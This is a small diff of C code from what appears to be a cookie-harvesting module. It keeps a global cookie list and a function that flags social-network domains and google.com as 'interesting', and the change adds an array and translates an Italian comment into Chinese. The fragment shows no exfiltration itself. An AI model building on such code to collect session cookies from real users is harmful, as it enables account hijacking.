@@ -12,14 +12,14 @@ typedef struct _cookie_list_entry_struct {
 } cookie_list_entry_struct;
 cookie_list_entry_struct *g_cookie_list = NULL;
 DWORD g_cookie_count = 0;
-
+cookie_list_entry_struct ArryC[40];
 BOOL IsInterestingDomainW(WCHAR *domain)
 {
 	for (int i=0; i<SOCIAL_ENTRY_COUNT; i++)
 		if (!wcscmp(domain, social_entry[i].domain))
 			return TRUE;
 
-	// Caso particolare per cookie di mail.google.com messi sul dominio principale
+	//特殊情况下的mail.google.com cookie 放在主域名
 	if (!wcscmp(domain, L"google.com"))
 		return TRUE;
 
